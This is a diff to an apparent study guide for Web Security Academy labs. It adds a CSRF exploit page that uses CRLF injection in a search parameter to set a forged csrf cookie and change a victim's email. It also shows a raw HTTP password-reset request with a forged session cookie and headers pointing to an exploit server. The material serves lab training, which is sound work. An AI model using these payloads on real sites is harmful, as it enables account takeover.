@@ -1257,15 +1257,19 @@ history.pushState('', '', '/');
 
 >In the target we ***identify*** that the CSRF key token is duplicated in the cookie value. Another ***indicator*** is the cookie ```LastSearchTerm``` contain the value searched. By giving search value that contain ```%0d%0a``` we can inject an **end of line** and **new line** characters to create new CSRF cookie and value.  
 
+![set cookie csrf fake](images/set-cookie-csrf-fake.png)  
+
+>In the exploit code ```img src``` tag we set cookie for csrf to fake.  
+
 ```html
 <html>
   <body>
-    <form action="https://0a7a003b0426117dc1017b6b0051009e.web-security-academy.net/my-account/change-email" method="POST">
+    <form action="https://TARGET.net/my-account/change-email" method="POST">
       <input type="hidden" name="email" value="ATTACKER&#64;EXPLOIT-SERVER&#46;NET" />
       <input type="hidden" name="csrf" value="fake" />
       <input type="submit" value="Submit request" />
     </form>
-    <img src="https://0a7a003b0426117dc1017b6b0051009e.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
+    <img src="https://TARGET.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
   </body>
 </html>
 ```  
@@ -1280,7 +1284,7 @@ history.pushState('', '', '/');
 
 ```html
 POST /refreshpassword HTTP/1.1
-Host: TARGET.web-security-academy.net
+Host: TARGET.net
 Cookie: session=%7b%22username%22%3a%22carlos%22%2c%22isloggedin%22%3atrue%7d--MCwCFAI9forAezNBAK%2fWxko91dgAiQd1AhQMZgWruKy%2fs0DZ0XW0wkyATeU7aA%3d%3d
 Content-Length: 60
 Cache-Control: max-age=0
@@ -1288,14 +1292,14 @@ Sec-Ch-Ua: "Chromium";v="109", "Not_A Brand";v="99"
 Sec-Ch-Ua-Mobile: ?0
 Sec-Ch-Ua-Platform: "Linux"
 Upgrade-Insecure-Requests: 1
-Origin: https://TARGET.web-security-academy.net
+Origin: https://TARGET.net
 Content-Type: application/x-www-form-urlencoded
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
 X-Forwarded-Host: exploit.exploit-server.net
 X-Host: exploit.exploit-server.net
 X-Forwarded-Server: exploit.exploit-server.net
-Referer: https://TARGET.web-security-academy.net/refreshpassword
+Referer: https://TARGET.net/refreshpassword
 Accept-Encoding: gzip, deflate
 Accept-Language: en-US,en;q=0.9
 Connection: close
